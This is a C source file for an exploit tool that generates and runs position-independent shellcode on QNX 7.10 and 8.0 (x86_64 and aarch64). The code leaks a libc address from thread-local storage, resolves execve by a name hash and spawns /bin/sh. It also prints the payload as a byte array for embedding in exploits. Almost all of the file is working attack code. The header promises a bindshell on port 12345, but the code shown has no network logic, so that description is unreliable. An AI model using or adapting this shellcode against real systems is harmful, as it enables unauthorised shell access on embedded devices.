/*
 * QNX 8.04, 8.00, 7.10 x86_64/aarch64le ELF Resolver Shellcode
 * Bindshell (to port 12345)
 *
 * By Claes M Sjöberg, <cmn@signedness.org> April 2026
 *
 * Compile for x86_64:
 *  qcc -Vgcc_ntox86_64 -fPIC -fno-stack-protector \
 *       -Wall -o elf_execve elf_bindshell.c 
 *      
 * Compile for aarch64le:
 *  qcc -Vgcc_ntoaarch64le -fPIC -fno-stack-protector \
 *       -Wall -o elf_execve elf_bindshell.c
 */

#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <errno.h>
#include <string.h>

/*
 * Elf64 
 */

/* 0x7F 'E' 'L' 'F'          */
#define ELF_MAGIC 0x464C457FU  

/* EI_CLASS values */
#define ELFCLASS32 1
#define ELFCLASS64 2

/* e_ident indices */
#define EI_CLASS 4

/* Segment types */
#define PT_DYNAMIC 2

/* Dynamic entry tags */
#define DT_NULL      0
#define DT_SYMTAB    6
#define DT_STRTAB    5
#define DT_STRSZ    10
#define DT_SYMENT   11

typedef struct {
    uint8_t  e_ident[16];
    uint16_t e_type;
    uint16_t e_machine;
    uint32_t e_version;
    uint64_t e_entry;
    uint64_t e_phoff;
    uint64_t e_shoff;
    uint32_t e_flags;
    uint16_t e_ehsize;
    uint16_t e_phentsize;
    uint16_t e_phnum;
    uint16_t e_shentsize;
    uint16_t e_shnum;
    uint16_t e_shstrndx;
} Elf64_Ehdr;

typedef struct {
    uint32_t p_type;
    uint32_t p_flags;
    uint64_t p_offset;
    uint64_t p_vaddr;
    uint64_t p_paddr;
    uint64_t p_filesz;
    uint64_t p_memsz;
    uint64_t p_align;
} Elf64_Phdr;

typedef struct {
    uint32_t st_name;
    uint8_t  st_info;
    uint8_t  st_other;
    uint16_t st_shndx;
    uint64_t st_value;
    uint64_t st_size;
} Elf64_Sym;

typedef struct {
    int64_t  d_tag;
    uint64_t d_val;   /* also used as d_ptr */
} Elf64_Dyn;


/* Hashes for all the symbols used */
#define HASH_EXECVE 0xd1b41b25

/* Symbols used */
typedef struct syms {
    /* libc.so */
    int (*execve)(const char *, char **, char **);
} syms_t;

/* Local routines */
static uint32_t calc_hash(const char *);
static void *getsym(const void *, uint32_t);
static void *find_elf_base(const void *);
static void *get_tls(void);
static void *get_libc_base(void);


/* Symbol resolver macro */
#define GETSYM(_save, _base, _hash)                     \
{                                                       \
    if ( ((_save) = getsym((_base), (_hash))) == NULL)  \
        return -1;                                      \
}                                                       \

/*
 * Start of shellcode.
 */
int
shellcode_start()
{
    syms_t sm;
    char path[8];
    char *av[2];
    void *libcbase;

    if ( (libcbase = get_libc_base()) == NULL) 
        return -1;

    GETSYM(sm.execve, libcbase, HASH_EXECVE);

    path[0] = '/';
    path[1] = 'b';
    path[2] = 'i';
    path[3] = 'n';
    path[4] = '/';
    path[5] = 's';
    path[6] = 'h';
    path[7] = '\0';

    av[0] = path;
    av[1] = NULL;
    sm.execve(path, av, NULL);
    return -1;
}


static uint32_t
calc_hash(const char *str)
{
    uint32_t hash = 0;

    while (*str) 
        hash = ((hash << 5) | (hash >> 27)) + *str++;
    return hash;
}


static void *
getsym(const void *elf_base, uint32_t target_hash)
{
    const uint8_t *base; 
    const Elf64_Ehdr *ehdr;
    const Elf64_Phdr *phdrs; 
    const Elf64_Sym *symtab;
    const char *strtab;
    uint64_t syment;
    uint64_t nsyms;

    base = elf_base;
    ehdr = elf_base;
    phdrs = (const Elf64_Phdr *)(base + ehdr->e_phoff);

    /* Locate PT_DYNAMIC segment */
    Elf64_Dyn *dyn = NULL;
    for (uint16_t i = 0; i < ehdr->e_phnum; i++) {
        if (phdrs[i].p_type == PT_DYNAMIC) {
            dyn = (Elf64_Dyn *)(base + phdrs[i].p_vaddr);
            break;
        }
    }
    if (dyn == NULL) 
        return NULL;

    /* Walk dynamic entries to find symtab, strtab, and syment */
    symtab = NULL;
    strtab = NULL;
    syment = sizeof(Elf64_Sym);

    for (Elf64_Dyn *d = dyn; d->d_tag != DT_NULL; d++) {
        switch (d->d_tag) {
            case DT_SYMTAB: 
                symtab = (Elf64_Sym *)(base + d->d_val); 
                break;
            
            case DT_STRTAB: 
                strtab = (char *)(base + d->d_val); 
                break;
            
            case DT_SYMENT: 
                syment = d->d_val;                               
                break;
        }
    }
    if (symtab == NULL || strtab == NULL) 
        return NULL;

    /* Derive symbol count from the gap between symtab and strtab */
    nsyms = (uint64_t)((uint8_t *)strtab - (uint8_t *)symtab) / syment;

    for (uint64_t i = 0; i < nsyms; i++) {
        const Elf64_Sym *sym;

        sym = (Elf64_Sym *)((uint8_t *)symtab + i * syment);

        if (sym->st_name == 0 || sym->st_value == 0) 
            continue;

        if (calc_hash(strtab + sym->st_name) == target_hash)
            return (void *)(base + sym->st_value);
    }

    return NULL;
}

#include <sys/nto_version.h>
#if defined(_NTO_VERSION) && (_NTO_VERSION == 800)

/*
 * Thread local storage. This data is at the top of each threads stack.
 * __errptr is a pointer to errno, which is located in libc -> leak
 */
struct _thread_local_storage {
    _Sizet __stacksize;
    void *__arg;
    int *__errptr;
    int __errval; /* Not used for main() thread. */
    unsigned __flags;
    int __pid;
    int __tid;
    unsigned __owner;
    void *__stackaddr;
    unsigned __guardsize;
    unsigned __numkeys;
    void **__keydata; /* Indexed by pthread_key_t */
    void *__cleanup;
    void *__pt_tsd;
    void *__ldd_data; /* Used by the ldd. */
    //__sa_action_func_t *__sigaction;
    void *__sigaction;
    void *__muon_reserved;
    void *__cxa_atexit_data;
};

#elif defined(_NTO_VERSION) && (_NTO_VERSION == 710)
/*
 * Thread local storage. This data is at the top of each threads stack.
 */

#define __TLS_FIELDS                                    \
    void *__exitfunc;       \
    void *__arg;            \
    int *__errptr;      \
    int __errval; /* Not used for main() thread. */ \
    unsigned __flags;        \
    int __pid;          \
    int __tid;          \
    unsigned __owner;        \
    void *__stackaddr;    \
    unsigned __reserved1;    \
    unsigned __numkeys;      \
    void **__keydata; /* Indexed by pthread_key_t */ \
    void *__cleanup;      \
    void *__cxa_atexit_data;  \
    void *__ldd_data; /* Used by the ldd. */ \
    void *__sigaction;

struct _thread_local_storage {
    __TLS_FIELDS
};

#else
#error "Missing QNX target version"
#endif

/*
 * Find ELF base from address.
 * Walk backward and look for ELF tag.
 */
static void *
find_elf_base(const void *addr)
{
    uint8_t *p;

    /* Align down to the nearest page boundary */
    p = (uint8_t *)((uintptr_t)addr & ~(uintptr_t)0xFFF);

    for (; p > (const uint8_t *)0x1000; p -= 0x1000) {
        if (*(const uint32_t *)p == ELF_MAGIC) {
            return p;
        }
    }

    return NULL;
}


/*
 * Get thread local storage pointer.
 */
static inline void *
get_tls()
{
    void *tp;

#if defined(__x86_64__) && (_NTO_VERSION == 800)
    __asm__ __volatile__(
        "movq %%fs:0x10, %%rax"
        : "=a" (tp)
    );
#endif

#if defined(__aarch64__) && (_NTO_VERSION == 800)
    __asm__ __volatile__(
        "mrs x0, tpidr_el0\n\t"
        "ldr %0, [x0, #0x8]"
        : "=r"(tp)
    );
#endif

#if defined(__x86_64__) && (_NTO_VERSION == 710)
    __asm__ __volatile__(
        "movq %%fs:0x38, %%rax"
        : "=a" (tp)
    );
#endif

#if defined(__aarch64__) && (_NTO_VERSION == 710)
    __asm__ __volatile__(
        "mrs x0, tpidrro_el0\n\t"
        : "=r"(tp)
    );
#endif

    return tp;
}


/*
 * Attempt to find libc base by walking backwards 
 * from leaked address.
 */ 
static void *
get_libc_base()
{
    struct _thread_local_storage *tls;
    void *leak;
    
    if ( (tls = get_tls()) == NULL) 
        return NULL;
    
#if defined(_NTO_VERSION) && (_NTO_VERSION == 800)
    /* errno points inside libc */
    leak = tls->__errptr;
#elif defined(_NTO_VERSION) && (_NTO_VERSION == 710)
    /* __exitfunc points inside libc */
    leak = tls->__exitfunc;
#endif

    return find_elf_base(leak);
}


/* Symbol to mark end of shellcode */
void shellcode_end() {}

/*
 * Write shellcode to stdout as byte array
 */
void
writecode(uint8_t *code, size_t codelen)
{
    size_t i;

    printf("\n/* ELF resolving shellcode %lu bytes */\n", 
        codelen);
    printf("unsigned char code[] = {\n");

    for (i=0; i<codelen; i++) {
        printf("0x%02x", code[i]);
        if ((i+1) != codelen)
            printf(", ");

        if (((i+1) % 12) == 0)
            printf("\n");
    }
    printf("}; \n");

}


int
main(int argc, char **argv, char **envp)
{
    uint8_t *code;
    size_t codelen;
    int ret;

    code = (void *)shellcode_start;
    codelen = (void *)shellcode_end - (void *)shellcode_start;
    writecode(code, codelen);

    printf("[+] Running shellcode (%lu bytes)\n", codelen);
    ret = shellcode_start();
    fprintf(stderr, "** Error: shellcode failed: %d %s\n", 
        ret, strerror(errno));
    getchar();
    return -1;
}
